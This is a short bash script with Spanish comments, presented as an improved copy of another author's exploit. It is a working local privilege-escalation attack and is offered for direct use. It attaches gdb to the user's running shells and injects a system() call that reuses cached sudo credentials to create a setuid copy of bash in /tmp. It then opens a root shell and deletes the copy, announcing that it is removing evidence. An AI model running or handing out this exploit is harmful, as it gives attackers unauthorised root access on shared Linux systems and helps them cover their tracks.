# Requerimientos: tener gdb
# Esto es una copia mejorada del script que hizo s4vitar
# Hecho por MDS1GNAL
# https://github.com/MDS1GNAL
# Lo unico que tienes que hacer es ejecutar el exploit y esperar

#!/bin/bash
pgrep "^(echo $(cat /etc/shells | tr '/' ' ' | awk 'NF{print $NF}' | tr '\n' '|'))$" -u "$(id -u)" | sed '$ d' | while read shell_pid;do
    if [[ $(cat /proc/${shell_pid}/commm 2>/dev/null) ]] || [[ $(pwdx ${shell_pid} 2>/dev/null) ]];then
      		echo "[*] PID -> "$(cat "/proc/${shell_pid}/comm" 2>/dev/null)
      		echo "[*] Ruta -> $(pwdx ${shell_pid} 2>/dev/null)"
    fi
    	echo 'call system("echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 ; echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1")' | gdb -q -n -p "${shell_pid}" >/dev/null 2>&1
    	done
    if [ -f /tmp/bash ]; then
      /tmp/bash -p -c 'echo "[*] Eliminando pruebas...";rm /tmp/bash;echo "[*] Aqui tienes root..."
      echo "[v]"
      tput cnorm
      bash -p'
    else
      echo -e "\n[*] Opss... Ha habido un error :(\t\t[x]"
    fi
